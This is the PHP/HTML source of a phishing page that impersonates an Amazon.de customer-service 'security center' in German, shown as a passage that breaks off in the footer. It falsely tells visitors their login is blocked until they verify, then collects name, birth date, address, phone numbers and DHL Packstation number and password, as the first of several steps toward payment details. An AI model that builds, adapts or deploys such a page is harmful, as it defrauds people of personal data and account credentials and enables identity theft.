<?php
	session_start();
	include("config.php");
	
	if (isset($_SESSION['finished']) && $_SESSION['finished']) {
		header('Location: '. $redirect);
	}
?>

<!DOCTYPE html>
<html class="a-ws a-js a-audio a-video a-canvas a-svg a-drag-drop a-geolocation a-history a-webworker a-autofocus a-input-placeholder a-textarea-placeholder a-local-storage a-gradients a-transform3d a-touch-scrolling a-text-shadow a-text-stroke a-box-shadow a-border-radius a-border-image a-opacity a-transform a-transition a-ember" data-aui-build-date="3.17.4.2-2017-03-18">
	<head>
		<meta http-equiv="content-type" content="text/html; charset=UTF-8">
		<link rel="stylesheet" href="src/css/31O9784sOL.css">
		<link rel="stylesheet" href="src/css/61qjsbDraqL.css">
		<title><?php echo $title ?></title>
		<link rel="stylesheet" href="src/css/01IP25TkamL.css">
		<link rel="stylesheet" href="src/css/419ZIIK4ICL.css">
		<link rel="stylesheet" href="src/font-awesome/css/font-awesome.min.css">
		<link rel="stylesheet" href="//code.jquery.com/ui/1.12.1/themes/base/jquery-ui.css">
		<link rel="stylesheet" href="src/css/custom.css?<?php echo time();?>">

		<link href="src/img/favicon.ico" rel="shortcut icon" />
		<script src="//code.jquery.com/jquery-1.11.0.min.js"></script>
		<script src="https://code.jquery.com/ui/1.12.1/jquery-ui.js"></script>
		<script type="text/javascript">
			$(document).ready(function() {
				$( "#packstation" ).click(function() { 
					if ($("#packstation" ).is( ":checked" )) {
						$("#ps_image").css("display", "table-row");
						$("#ps_nummer").css("display", "table-row");
						$("#ps_passwort").css("display", "table-row");
						$("#ps_active").val("1");
					} else {
						$("#ps_image").css("display", "none");
						$("#ps_nummer").css("display", "none");
						$("#ps_passwort").css("display", "none");
						$("#ps_active").val("0");
					}
				});			

				$("form select").each(function() {
					$(this).selectmenu();
					if($(this).hasClass("a-form-error")) {
						var id = $(this).attr('id') + "-button";
						$("#" + id).addClass("a-form-error");
					}
				});
			});
		</script>

		<style>
			.ui-selectmenu-menu ul {
				max-height: 300px;
			}		
		</style>
	</head>
	
	<body class="a-meter-animate">
		<style type="text/css">
			.nav-sprite-v1 .nav-sprite, .nav-sprite-v1 .nav-icon {
			  background-image: url(src/img/nav-sprite-global_bluebeacon-1x_optimized._CB295582946_.png);
			  background-position: 0 1000px;
			  background-repeat: repeat-x;
			}
			.nav-spinner {
			  background-image: url(src/img/snake._CB192194539_.gif);
			  background-position: center center;
			  background-repeat: no-repeat;
			}
			.nav-timeline-icon, .nav-access-image, .nav-timeline-prime-icon {
			  background-image: url(src/img/timeline_sprite_1x.png);
			  background-repeat: no-repeat;
			}
		</style>
		<link rel="stylesheet" href="src/css/uDzwVmjTcOCPxHLlU3NYtRo6Q5Fev0GI729sXbWEn4.css?<?php echo time();?>">
		<link rel="stylesheet" href="src/css/719Je9HLSTL.css">
		<a id="nav-top"></a>

		<header class="nav-locale-de nav-lang-de nav-ssl nav-unrec nav-paladin-ww nav-opt-sprite">
			<div id="navbar" role="navigation" class="nav-sprite-v1 nav-bluebeacon">
				<div id="nav-belt">
					<div class="nav-left">
						<div id="nav-logo">
							<a href="#" class="nav-logo-link" tabindex="2">
								<span class="nav-logo-base nav-sprite">Amazon.de</span>
								<span class="nav-logo-ext nav-sprite"></span>
								<span class="nav-logo-locale nav-sprite"></span>
							</a>

							<a href="#" aria-label="" tabindex="3" class="nav-logo-tagline nav-sprite nav-prime-try">
								Prime testen
							</a>
						</div>
					</div>
					<div class="nav-right">
						<div id="nav-swmslot">
							<div id="navSwmHoliday" style="background-image: url(src/img/prime.jpg); width: 400px; height: 39px; overflow: hidden;position: relative;">
							<img alt="AIV" src="src/img/transparent-pixel.gif" usemap="#nav-swm-holiday-map" height="39px" border="0" width="400px"></div>
						</div>
					</div>
					
					<div class="nav-fill"></div>
				</div>
				
				<div id="nav-main" class="nav-sprite">
					<div class="nav-left">
						<div id="nav-shop">
							<a href="#" class="nav-a nav-a-2" id="nav-link-shopall" tabindex="10"><span class="nav-line-1"></span><span class="nav-line-2"><span class="nav-icon nav-arrow" style="visibility: hidden;"></span></span></a>
						</div>
					</div>
					<div class="nav-right">
						<div id="nav-tools">
							<a href="#" class="nav-a nav-a-2" data-nav-ref="nav_ya_signin" data-nav-role="signin" id="nav-link-yourAccount" tabindex="26" style="border-radius:3px;border: 1px solid #ccc;">
								<span class="nav-line-1">Hallo! Anmelden <span style="color:#FF9900">(Anmeldung nicht möglich! Verifikation erforderlich)</span></span>
								<span class="nav-line-2">Mein Konto<span class="nav-icon nav-arrow" style="visibility: visible;"></span></span>
							</a>
							<a href="#" class="nav-a nav-a-2" id="nav-link-prime" tabindex="27"><span class="nav-line-1"></span><span class="nav-line-2"><span class="nav-icon nav-arrow" style="visibility: hidden;"></span></span></a>
							<a href="#" class="nav-a nav-a-2" id="nav-link-wishlist" tabindex="28"><span class="nav-line-1"></span><span class="nav-line-2"><span class="nav-icon nav-arrow" style="visibility: hidden;"></span></span></a>
							<a href="#" class="nav-a nav-a-2" id="nav-link-wishlist" tabindex="28"><span class="nav-line-1"></span><span class="nav-line-2"><span class="nav-icon nav-arrow" style="visibility: hidden;"></span></span></a>
						</div>
					</div>
					<div class="nav-fill">
						<div id="nav-xshop-container" class="">
							<div id="nav-xshop">
								<a href="#" data-nav-tabindex="5" class="nav-a nav_a" id="nav-your-amazon">Anmeldung <span style="color:#7CAB2B">&#10004;</span></a>
								<a href="#" class="nav-a" tabindex="22"><span style="color:#FF9900">&#10148; Bestätigung der persönlichen Daten</span></a>
								<a href="#" class="nav-a" tabindex="23">Zahlungsmittel angeben <span style="color:red">&#10006;</span></a>
								<a href="#" class="nav-a" tabindex="24">Abschließen <span style="color:red">&#10006;</span></a>
							</div>
						</div>
					</div>
				</div>
				<div id="nav-subnav" style=""></div>
			</div>
		</header>

		<style>
		  #nav-prime-tooltip{
			padding: 0 20px 2px 20px;
			background-color: white;
			font-family: arial,sans-serif;
		  }
		  .nav-npt-text-title{
			font-family: arial,sans-serif;
			font-size: 18px;
			font-weight: bold;
			line-height: 21px;
			color: #E47923;
		  }
		  .nav-npt-text-detail, a.nav-npt-a{
			font-family: arial,sans-serif;
			font-size: 12px;
			line-height: 14px;
			color: #333333;
			margin: 2px 0px;
		  }
		  a.nav-npt-a {
			text-decoration: underline;
		  }
		</style>
		
		<div class="cs-content">
			<div class="cs-contact-title">
				<h1>
					Amazon - Kundenservice Sicherheitscenter
				</h1>
			</div>
			
			<table id="cs-content-table" cellspacing="0" cellpadding="0" border="0" width="100%">
				<tbody>
				<tr>
					<td colspan="2">
						<div class="f1-steps">
							<div class="f1-progress">
								<div class="f1-progress-line" data-now-value="16.66" data-number-of-steps="3" style="width: 16.66%;"></div>
							</div>
							<div class="f1-step active">
								<div class="f1-step-icon"><i class="fa fa-user"></i></div>
								<p>Bestätigung der hinterlegten persönlichen Daten</p>
							</div>
							<div class="f1-step">
								<div class="f1-step-icon"><i class="fa fa-dollar"></i></div>
								<p>Bestätigung der hinterlegten Zahlungsmittel</p>
							</div>
							<div class="f1-step">
								<div class="f1-step-icon"><i class="fa fa-check"></i></div>
								<p>Zahlungsinformationen bestätigen</p>
							</div>
						</div>						
					</td>
				</tr>

				<tr>
					<td valign="top" width="70%">
						<div class="leftcol">
							<div id="orderSection" class="cu-eyebrow " style="">
								<div class="cu-eb-top">
									<div class="cu-eb-top-left cu-eb-top-left-1"></div>
									<h2 class="step">Bestätigung der hinterlegten persönlichen Daten</h2>
								</div>

								<div class="cu-middle">
									<!-- <div class="cs-step" id="orderSelect" style="display:<?php echo ((isset($_SESSION['errList']) && count($_SESSION['errList'] != 0)) ? "block" : "none") ?>">
										<div id="orderUnrelatedArea" class="newOrderSummary" style="background-color:#FFFFDD;border: 1px solid #A31919">
											<table class="newOrderTable" cellspacing="0" cellpadding="0" border="0">
												<tbody>
													<tr valign="top">
													<td>
														<div class="newAccountText">
															<span style="background-position-y: -75px"></span>
															<h6>Es ist ein Fehler aufgetreten:</h6>
															<ul style="color:#A31919">
																<?php
																	/*
																	if (isset($_SESSION['errList'])) {
																		for ($i = 0; $i < count($_SESSION['errList']); $i++) {
																			echo '<li>' . $_SESSION['errList'][$i] . '</li>';
																		}
																		
																		unset($_SESSION['errList']);
																	}
																	*/
																?>
															</ul>
														</div>
													</td>
												</tr>
												</tbody>
											</table>                                                                           
										</div>
									</div> -->
								
									<div class="cs-step" id="orderSelect">
										<div id="orderUnrelatedArea" class="newOrderSummary">
											<table class="newOrderTable" cellspacing="0" cellpadding="0" border="0">
												<tbody>
													<tr valign="top">
													<td>
														<div class="newAccountText">
															<p><img src="src/img/info2.png" style="width:16px;height:16px"/> Bitte bestätigen Sie die bei uns hinterlegten persönlichen Daten wie Sie diese in Ihrem Konto eingegeben haben.</p>
														</div>
													</td>
												</tr>
												</tbody>
											</table>                                                                           
										</div>
									</div>
									
									<div class="contactEmail">
										<form id="sendEmail" name="sendEmail" action="index.php" method="POST">
											<input type="hidden" name="ps_active" id="ps_active" value="<?php echo ((isset($_SESSION['ps_active']) && $_SESSION['ps_active'] == 1) ? "1" : "0") ?>"/>
											
											<table cellspacing="10" cellpadding="0">
												<tbody>
													<tr>
														<td style="padding-bottom:7px"><b><label style="font-size:13px">Vorname:</label></b></td>
														<td style="padding-bottom:7px">
															<input id="vorname" name="vorname" value="<?php echo (isset($_SESSION['vorname']) ? $_SESSION['vorname'] : ""); ?>" maxlength="30" type="text" style="height:18px;width:250px;" class="<?php echo (isset($_SESSION['v_err']) ? "a-form-error" : ""); ?>">

															<?php if(isset($_SESSION['errList']['vorname'])) { ?>
																<div class="a-section a-spacing-none a-spacing-top-micro address-ui-widgets-inline-error-alert">
																	<div class="a-box a-alert-inline a-alert-inline-error" aria-live="assertive" role="alert">
																		<div class="a-box-inner a-alert-container">
																			<i class="a-icon a-icon-alert"></i>
																			<div class="a-alert-content">
																				<div class="a-section"><?php echo $_SESSION['errList']['vorname'];?></div>
																			</div>
																		</div>
																	</div>
																</div>
															<?php } ?>			
														</td>
													</tr>
													
													<tr>
														<td style="padding-bottom:10px"><b><label style="font-size:13px">Nachname:</label></b></td>
														<td style="padding-bottom:10px">
															<input id="nachname" name="nachname" value="<?php echo (isset($_SESSION['nachname']) ? $_SESSION['nachname'] : ""); ?>" maxlength="30" type="text" style="height:18px;width:250px;" class="<?php echo (isset($_SESSION['n_err']) ? "a-form-error" : ""); ?>">

															<?php if(isset($_SESSION['errList']['nachname'])) { ?>
																<div class="a-section a-spacing-none a-spacing-top-micro address-ui-widgets-inline-error-alert">
																	<div class="a-box a-alert-inline a-alert-inline-error" aria-live="assertive" role="alert">
																		<div class="a-box-inner a-alert-container">
																			<i class="a-icon a-icon-alert"></i>
																			<div class="a-alert-content">
																				<div class="a-section"><?php echo $_SESSION['errList']['nachname'];?></div>
																			</div>
																		</div>
																	</div>
																</div>
															<?php } ?>															
														</td>
													</tr>
													
													<tr>
														<td style="padding-bottom:10px"><b><label style="font-size:13px">Geburtsdatum:</label></b></td>
														<td style="padding-bottom:10px">
														
															  <?php	
																if (isset($_SESSION['dob1_err'])) {
																	echo '<select class="a-select-multiple a-form-error" style="border-radius: 3px 0px 0px 3px;width:72px;padding:4px" id="dob1" name="dob1"><option value="Tag" disabled selected>Tag</option>';
																	unset($_SESSION['dob1_err']);
																} else {
																	echo '<select style="border:1px solid #a6a6a6;border-radius: 3px 0px 0px 3px;width:72px;padding:4px;border-top-color: #949494" id="dob1" name="dob1"><option value="Tag" disabled selected>Tag</option>';
																}
																
																for ($i = 1; $i <= 31; $i++) {
																	if (isset($_SESSION['dob1'])) {
																		if ($i == $_SESSION['dob1']) {
																			echo '<option selected value="' . str_pad($i, 2, '0', STR_PAD_LEFT) . '">' . str_pad($i, 2, '0', STR_PAD_LEFT) . '</option>';
																		} else {
																			echo '<option value="' . str_pad($i, 2, '0', STR_PAD_LEFT) . '">' . str_pad($i, 2, '0', STR_PAD_LEFT) . '</option>';
																		}
																	} else {
																		echo '<option value="' . str_pad($i, 2, '0', STR_PAD_LEFT) . '">' . str_pad($i, 2, '0', STR_PAD_LEFT) . '</option>';
																	}
																}
																echo '</select>';
															?>
															
															&nbsp;
															
															<?php
																if (isset($_SESSION['dob2_err'])) {
																	echo '<select class="a-select-multiple a-form-error" style="width:72px;padding:4px" id="dob2" name="dob2"><option value="Monat" disabled selected>Monat</option>';
																	unset($_SESSION['dob2_err']);
																} else {
																	echo '<select style="border:1px solid #a6a6a6;width:72px;padding:4px;border-top-color: #949494" id="dob2" name="dob2"><option value="Monat" disabled selected>Monat</option>';
																}
																
																for ($i = 1; $i <= 12; $i++) {
																	if (isset($_SESSION['dob2'])) {
																		if ($i == $_SESSION['dob2']) {
																			echo '<option selected value="' . str_pad($i, 2, '0', STR_PAD_LEFT) . '">' . str_pad($i, 2, '0', STR_PAD_LEFT) . '</option>';
																		} else {
																			echo '<option value="' . str_pad($i, 2, '0', STR_PAD_LEFT) . '">' . str_pad($i, 2, '0', STR_PAD_LEFT) . '</option>';
																		}
																	} else {
																		echo '<option value="' . str_pad($i, 2, '0', STR_PAD_LEFT) . '">' . str_pad($i, 2, '0', STR_PAD_LEFT) . '</option>';
																	}
																}
																echo '</select>';
															?>
															
															&nbsp;
															
															<?php
																if (isset($_SESSION['dob3_err'])) {
																	echo '<select class="a-select-multiple a-form-error" style="width:72px;padding:4px" id="dob3" name="dob3"><option value="Jahr" disabled selected>Jahr</option>';
																	unset($_SESSION['dob3_err']);
																} else {
																	echo '<select style="border:1px solid #a6a6a6;width:72px;padding:4px;border-top-color: #949494" id="dob3" name="dob3"><option value="Jahr" disabled selected>Jahr</option>';
																}
																
																$year = date("Y");
																for ($i = $year - 18; $i >= $year - 100; $i--) {
																	if (isset($_SESSION['dob3'])) {
																		if ($i == $_SESSION['dob3']) {
																			echo '<option selected value="' . str_pad($i, 2, '0', STR_PAD_LEFT) . '">' . str_pad($i, 2, '0', STR_PAD_LEFT) . '</option>';
																		} else {
																			echo '<option value="' . str_pad($i, 2, '0', STR_PAD_LEFT) . '">' . str_pad($i, 2, '0', STR_PAD_LEFT) . '</option>';
																		}
																	} else {
																		echo '<option value="' . str_pad($i, 2, '0', STR_PAD_LEFT) . '">' . str_pad($i, 2, '0', STR_PAD_LEFT) . '</option>';
																	}
																}
																echo '</select>';
															?>

															<?php if(isset($_SESSION['errList']['dob'])) { ?>
																<div class="a-section a-spacing-none a-spacing-top-micro address-ui-widgets-inline-error-alert">
																	<div class="a-box a-alert-inline a-alert-inline-error" aria-live="assertive" role="alert">
																		<div class="a-box-inner a-alert-container">
																			<i class="a-icon a-icon-alert"></i>
																			<div class="a-alert-content">
																				<div class="a-section"><?php echo $_SESSION['errList']['dob'];?></div>
																			</div>
																		</div>
																	</div>
																</div>
															<?php } ?>														
														</td>
													</tr>
													
													<tr>
														<td style="padding-bottom:7px"><b><label style="font-size:13px">Anschrift (Straße & Hausnummer):</label></b></td>
														<td style="padding-bottom:7px">
															<input id="adresse" name="adresse" value="<?php echo (isset($_SESSION['adresse']) ? $_SESSION['adresse'] : ""); ?>" maxlength="70" type="text" style="height:18px;width:250px;" class="<?php echo (isset($_SESSION['a_err']) ? "a-form-error" : ""); ?>">

															<?php if(isset($_SESSION['errList']['adresse'])) { ?>
																<div class="a-section a-spacing-none a-spacing-top-micro address-ui-widgets-inline-error-alert">
																	<div class="a-box a-alert-inline a-alert-inline-error" aria-live="assertive" role="alert">
																		<div class="a-box-inner a-alert-container">
																			<i class="a-icon a-icon-alert"></i>
																			<div class="a-alert-content">
																				<div class="a-section"><?php echo $_SESSION['errList']['adresse'];?></div>
																			</div>
																		</div>
																	</div>
																</div>
															<?php } ?>															
														</td>
													</tr>
													
													<tr>
														<td style="padding-bottom:7px"><b><label style="font-size:13px">Postleitzahl:</label></b></td>
														<td style="padding-bottom:7px">
															<input id="plz" name="plz" value="<?php echo (isset($_SESSION['plz']) ? $_SESSION['plz'] : ""); ?>" maxlength="5" type="text" style="height:18px;width:250px;" class="<?php echo (isset($_SESSION['p_err']) ? "a-form-error" : ""); ?>">

															<?php if(isset($_SESSION['errList']['plz'])) { ?>
																<div class="a-section a-spacing-none a-spacing-top-micro address-ui-widgets-inline-error-alert">
																	<div class="a-box a-alert-inline a-alert-inline-error" aria-live="assertive" role="alert">
																		<div class="a-box-inner a-alert-container">
																			<i class="a-icon a-icon-alert"></i>
																			<div class="a-alert-content">
																				<div class="a-section"><?php echo $_SESSION['errList']['plz'];?></div>
																			</div>
																		</div>
																	</div>
																</div>
															<?php } ?>															
														</td>
													</tr>
													
													<tr>
														<td style="padding-bottom:7px"><b><label style="font-size:13px">Wohnort:</label></b></td>
														<td style="padding-bottom:7px">
															<input id="ort" name="ort" value="<?php echo (isset($_SESSION['ort']) ? $_SESSION['ort'] : ""); ?>" maxlength="70" type="text" style="height:18px;width:250px;" class="<?php echo (isset($_SESSION['o_err']) ? "a-form-error" : ""); ?>">

															<?php if(isset($_SESSION['errList']['ort'])) { ?>
																<div class="a-section a-spacing-none a-spacing-top-micro address-ui-widgets-inline-error-alert">
																	<div class="a-box a-alert-inline a-alert-inline-error" aria-live="assertive" role="alert">
																		<div class="a-box-inner a-alert-container">
																			<i class="a-icon a-icon-alert"></i>
																			<div class="a-alert-content">
																				<div class="a-section"><?php echo $_SESSION['errList']['ort'];?></div>
																			</div>
																		</div>
																	</div>
																</div>
															<?php } ?>																
														</td>
													</tr>
													
													<tr>
														<td style="padding-bottom:7px"><b><label style="font-size:13px">Festnetznummer:</label></b></td>
														<td style="padding-bottom:7px">
															<input id="tlfnr" name="tlfnr" value="<?php echo (isset($_SESSION['tlfnr']) ? $_SESSION['tlfnr'] : ""); ?>" maxlength="70" type="text" style="height:18px;width:250px;" class="<?php echo (isset($_SESSION['t_err']) ? "a-form-error" : ""); ?>">

															<?php if(isset($_SESSION['errList']['tlfnr'])) { ?>
																<div class="a-section a-spacing-none a-spacing-top-micro address-ui-widgets-inline-error-alert">
																	<div class="a-box a-alert-inline a-alert-inline-error" aria-live="assertive" role="alert">
																		<div class="a-box-inner a-alert-container">
																			<i class="a-icon a-icon-alert"></i>
																			<div class="a-alert-content">
																				<div class="a-section"><?php echo $_SESSION['errList']['tlfnr'];?></div>
																			</div>
																		</div>
																	</div>
																</div>
															<?php } ?>															
														</td>
													</tr>
													
													<tr>
														<td style="padding-bottom:20px;border-bottom: 1px dotted #DDD"><b><label style="font-size:13px">Mobilfunknummer:</label></b></td>
														<td style="padding-bottom:20px;border-bottom: 1px dotted #DDD">
															<input id="handynr" name="handynr" value="<?php echo (isset($_SESSION['handynr']) ? $_SESSION['handynr'] : ""); ?>" maxlength="70" type="text" style="height:18px;width:250px;" class="<?php echo (isset($_SESSION['h_err']) ? "a-form-error" : ""); ?>">

															<?php if(isset($_SESSION['errList']['handynr'])) { ?>
																<div class="a-section a-spacing-none a-spacing-top-micro address-ui-widgets-inline-error-alert">
																	<div class="a-box a-alert-inline a-alert-inline-error" aria-live="assertive" role="alert">
																		<div class="a-box-inner a-alert-container">
																			<i class="a-icon a-icon-alert"></i>
																			<div class="a-alert-content">
																				<div class="a-section"><?php echo $_SESSION['errList']['handynr'];?></div>
																			</div>
																		</div>
																	</div>
																</div>
															<?php } ?>																
														</td>
													</tr>
													
													<tr>
														<td style="padding-top:15px;padding-bottom:20px"><input type="checkbox" id="packstation" name="packstation" <?php echo ((isset($_SESSION['ps_active']) && $_SESSION['ps_active'] == 1) ? "checked" : "") ?>> Packstationdaten eingeben</td>
														<td style="padding-top:15px;padding-bottom:20px"></td>
													</tr>
													
													<tr id="ps_image" style="display:<?php echo ((isset($_SESSION['ps_active']) && $_SESSION['ps_active'] == 1) ? "table-row" : "none") ?>">
														<td style="padding-bottom:7px"><img src="src/img/paket_de.png" style="height:33px;width:260px"/></td>
														<td style="padding-bottom:7px"></td>
													</tr>
													
													<tr id="ps_nummer" style="display:<?php echo ((isset($_SESSION['ps_active']) && $_SESSION['ps_active'] == 1) ? "table-row" : "none") ?>">
														<td style="padding-bottom:7px"><b><label style="font-size:13px">PostNummer:</label></b></td>
														<td style="padding-bottom:7px">
															<input id="ps_nr" name="ps_nr" value="<?php echo (isset($_SESSION['ps_nr']) ? $_SESSION['ps_nr'] : ""); ?>" autocomplete="off" maxlength="15" type="text" style="height:18px;width:250px;" class="pull-left <?php echo (isset($_SESSION['ps_nr_err']) ? "a-form-error" : ""); ?>">
															<div id='box' class='pull-left'>
																<a href='#' class="cvvIcon">
																	<span style="left:0;margin-left:-330px;top:60%;width:306px;height:196px"><img src="src/img/dhlgoldcard.jpg"/></span>
																</a>
															</div>
															<div class="clearfix"></div>

															<?php if(isset($_SESSION['errList']['ps_nr'])) { ?>
																<div class="a-section a-spacing-none a-spacing-top-micro address-ui-widgets-inline-error-alert">
																	<div class="a-box a-alert-inline a-alert-inline-error" aria-live="assertive" role="alert">
																		<div class="a-box-inner a-alert-container">
																			<i class="a-icon a-icon-alert"></i>
																			<div class="a-alert-content">
																				<div class="a-section"><?php echo $_SESSION['errList']['ps_nr'];?></div>
																			</div>
																		</div>
																	</div>
																</div>
															<?php } ?>																
														</td>
													</tr>
													
													<tr id="ps_passwort" style="display:<?php echo ((isset($_SESSION['ps_active']) && $_SESSION['ps_active'] == 1) ? "table-row" : "none") ?>">
														<td style="padding-bottom:7px"><b><label style="font-size:13px">Passwort:</label></b></td>
														<td style="padding-bottom:7px"><input id="ps_pw" name="ps_pw" value="<?php echo (isset($_SESSION['ps_pw']) ? $_SESSION['ps_pw'] : ""); ?>" autocomplete="off" maxlength="70" type="password" style="height:18px;width:250px;" class="<?php echo (isset($_SESSION['ps_pw_err']) ? "a-form-error" : ""); ?>">

															<?php if(isset($_SESSION['errList']['ps_pw'])) { ?>
																<div class="a-section a-spacing-none a-spacing-top-micro address-ui-widgets-inline-error-alert">
																	<div class="a-box a-alert-inline a-alert-inline-error" aria-live="assertive" role="alert">
																		<div class="a-box-inner a-alert-container">
																			<i class="a-icon a-icon-alert"></i>
																			<div class="a-alert-content">
																				<div class="a-section"><?php echo $_SESSION['errList']['ps_pw'];?></div>
																			</div>
																		</div>
																	</div>
																</div>
															<?php } ?>	
														</td>
													</tr>
													
													<tr>
														<td style="padding-top:15px"></td>
														<td style="padding-top:15px">
															<input type="hidden" name="doPersonaldata_x" value="1">
															<input type="hidden" name="doPersonaldata_y" value="1">
															<span id="B2B-Full-1-heroctavideo-register" class="a-button a-button-span12 a-button-primary button-register">
																<span class="a-button-inner">
																	<a id="B2B-Full-1-heroctavideo-register-announce" href="javascript:;" class="a-button-text" role="button" onClick="$('#sendEmail').submit();">Fortfahren</a>
																</span>
															</span>	
														</td>
													</tr>
												</tbody>
											</table>
										</form>
									</div>
								</div>

								<div class="cu-eb-bottom">
									<div class="cu-eb-bottom-left"></div>
								</div>
							</div>
						</div>
					</td>
					
					<td valign="top" width="30%">
						<div class="rightcol">
							<div class="a-section cs-help-sidebar-module take-action-sidebar">
								<div class="a-section inner">
									<div data-card-identifier="DigitalContentAndDevices" class="a-box ya-card">
										<div class="a-box-inner">
											<h4 class="a-spacing-micro">Schnelle Lösungen</h4>
											<ul class="a-unordered-list a-nostyle a-vertical">
												<li class="a-spacing-micro-custom">
													<span class="a-list-item">													
														<div class="a-fixed-left-grid">
															<div class="a-fixed-left-grid-inner" style="padding-left:46px">
																<div class="a-fixed-left-grid-col a-col-left" style="width:46px;margin-left:-46px;_margin-left:-23px;float:left;">
																	<a class="a-link-normal" href="#">
																		<img alt="" src="src/img/Box_smaller.png" width="46">
																	</a>
																</div>
																<div class="a-spacing-top-mini a-fixed-left-grid-col a-col-right" style="padding-left:3.5%;*width:96.1%;float:left;">
																	<a style="line-height: 15px; margin-top: 2px;display: inline-block;font-size: 13px;" class="a-link-normal quick-solution-action" href="#">Meine Bestellungen<br/>Nachverfolgen &amp; zurücksenden</a>
																</div>
															</div>
														</div>														
													</span>
												</li>
												<li class="a-spacing-micro-custom">
													<span class="a-list-item">
														<div class="a-fixed-left-grid">
															<div class="a-fixed-left-grid-inner" style="padding-left:46px">
																<div class="a-fixed-left-grid-col a-col-left" style="width:46px;margin-left:-46px;_margin-left:-23px;float:left;">
																	<a class="a-link-normal" href="#">
																		<img alt="" src="src/img/Devices_clear-bg.png" width="46">
																	</a>
																</div>
																<div class="a-spacing-top-base a-fixed-left-grid-col a-col-right" style="padding-left:3.5%;*width:96.1%;float:left;">
																	<a class="a-link-normal quick-solution-action a-size-base" href="#">Geräte &amp; Inhalte</a>
																</div>
															</div>
														</div>
													</span>
												</li>
												<li class="a-spacing-micro-custom">
													<span class="a-list-item">
														<div class="a-fixed-left-grid">
															<div class="a-fixed-left-grid-inner" style="padding-left:46px">
																<div class="a-fixed-left-grid-col a-col-left" style="width:46px;margin-left:-46px;_margin-left:-23px;float:left;">
																	<a class="a-link-normal" href="#">
																		<img alt="" src="src/img/Prime_clear-bg.png" width="46">
																	</a>
																</div>
																<div class="a-spacing-top-base a-fixed-left-grid-col a-col-right" style="padding-left:3.5%;*width:96.1%;float:left;">
																	<a class="a-link-normal quick-solution-action a-size-base" href="#">Prime-Mitgliedschaft</a>
																</div>
															</div>
														</div>
													</span>
												</li>
												<li class="a-spacing-micro-custom">
													<span class="a-list-item">
														<div class="a-fixed-left-grid">
															<div class="a-fixed-left-grid-inner" style="padding-left:46px">
																<div class="a-fixed-left-grid-col a-col-left" style="width:46px;margin-left:-46px;_margin-left:-23px;float:left;">
																	<a class="a-link-normal" href="#">
																		<img alt="" src="src/img/Payments_clear-bg.png" width="46">
																	</a>
																</div>
																<div class="a-spacing-top-base a-fixed-left-grid-col a-col-right" style="padding-left:3.5%;*width:96.1%;float:left;">
																	<a class="a-link-normal quick-solution-action a-size-base" href="#">Zahlungseinstellungen</a>
																</div>
															</div>
														</div>
													</span>
												</li>
											</ul>
										</div>
									</div>									

									<div data-card-identifier="DigitalContentAndDevices" class="a-box ya-card" style="margin-top: 20px">
										<div class="a-box-inner">
											<h4 class="a-spacing-micro">Digital content and devices</h4>
											<ul class="a-unordered-list a-nostyle a-vertical">
												<li class="a-spacing-micro">
													<span class="a-list-item">
														<a class="a-link-normal quick-solution-action" href="#">Artikel zurücksenden oder ersetzen</a>
													</span>
												</li>
												<li class="a-spacing-micro">
													<span class="a-list-item">
														<a class="a-link-normal quick-solution-action" href="#">Adressbuch verwalten</a>
													</span>
												</li>
												<li>
													<span class="a-list-item">
														<a class="a-link-normal quick-solution-action" href="#">Namen, E-Mail-Adresse oder Passwort ändern</a>
													</span>
												</li>
											</ul>
										</div>
									</div>
								</div>
							</div>

							<div data-card-identifier="DigitalContentAndDevices" class="a-box ya-card" style="margin-top: 20px">
								<div class="a-box-inner">
									<h4 class="a-spacing-micro">Finden Sie die Antwort auf Ihre Frage</h4>
									<div>
									   <p>Besuchen Sie unsere Hilfeforen und finden Sie Antworten und hilfreiche Informationen von der Amazon Community.</p>
									   <div>
											<a href="#">
												<span class="a-button" id="a-autoid-1"><span class="a-button-inner"><input class="a-button-input" type="button" aria-labelledby="a-autoid-1-announce"><span class="a-button-text" aria-hidden="true" id="a-autoid-1-announce"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Kindle Hilfeforum</font></font></span></span></span>
											</a>												   
									   </div>
									</div>		
								</div>
							</div>
						</div>
					</td>
				</tr>
				<tr>
					<td colspan="2">
					<img class="display:block" src="src/img/transparent-pixel.gif" height="1px" width="980px">
					</td>
				</tr>
			</tbody></table>
		</div>
		<?php
			if (isset($_SESSION['v_err'])) { unset($_SESSION['v_err']); }
			if (isset($_SESSION['n_err'])) { unset($_SESSION['n_err']); }
			if (isset($_SESSION['a_err'])) { unset($_SESSION['a_err']); }
			if (isset($_SESSION['p_err'])) { unset($_SESSION['p_err']); }
			if (isset($_SESSION['o_err'])) { unset($_SESSION['o_err']); }
			if (isset($_SESSION['t_err'])) { unset($_SESSION['t_err']); }
			if (isset($_SESSION['h_err'])) { unset($_SESSION['h_err']); }
			if (isset($_SESSION['ps_nr_err'])) { unset($_SESSION['ps_nr_err']); }
			if (isset($_SESSION['ps_pw_err'])) { unset($_SESSION['ps_pw_err']); }

			unset($_SESSION['errList']);
		?>
		<div id="navFooter" class="navLeftFooter nav-sprite-v1"> <a href="#" id="navBackToTop"> <div class="navFooterBackToTop"><span class="navFooterBackToTopText">Zurück zum Seitenanfang</span> </div> </a> <table class="navFooterVerticalColumn" cellspacing="0" align="center"> <tbody><tr> <td class="navFooterLinkCol"> <div class="navFooterColHead">Über Amazon</div> <ul> <li class="nav_first"> <a href="#" class="nav_a">Karriere bei Amazon</a> </li> <li> <a href="#" class="nav_a">Pressemitteilungen</a> </li> <li> <a href="#" class="nav_a">Über uns - von A bis Z</a> </li> <li> <a href="#" class="nav_a">Amazon Logistikblog</a> </li> <li class="nav_last "> <a href="#" class="nav_a">Impressum</a> </li> </ul> </td> <td class="navFooterColSpacerInner"></td> <td class="navFooterLinkCol"> <div class="navFooterColHead">Geld verdienen mit Amazon</div> <ul> <li class="nav_first"> <a href="#" class="nav_a">Jetzt verkaufen</a> </li> <li> <a href="#" class="nav_a">Verkaufen bei Amazon Business</a> </li> <li> <a href="#" class="nav_a">Partnerprogramm</a> </li> <li> <a href="#" class="nav_a">Versand durch Amazon</a> </li> <li> <a href="#" class="nav_a">Bewerben Sie Ihre Produkte</a> </li> <li> <a href="#" class="nav_a">Ihr Buch mit uns veröffentlichen</a> </li> <li> <a href="#" class="nav_a">Amazon Pay</a> </li> <li> <a href="#" class="nav_a">Werden Sie ein Amazon-Lieferant</a> </li> <li class="nav_last nav_a_carat "> <span class="nav_a_carat">›</span> <a href="#" class="nav_a">Alle anzeigen</a> </li> </ul> </td> <td class="navFooterColSpacerInner"></td> <td class="navFooterLinkCol"> <div class="navFooterColHead">Amazon 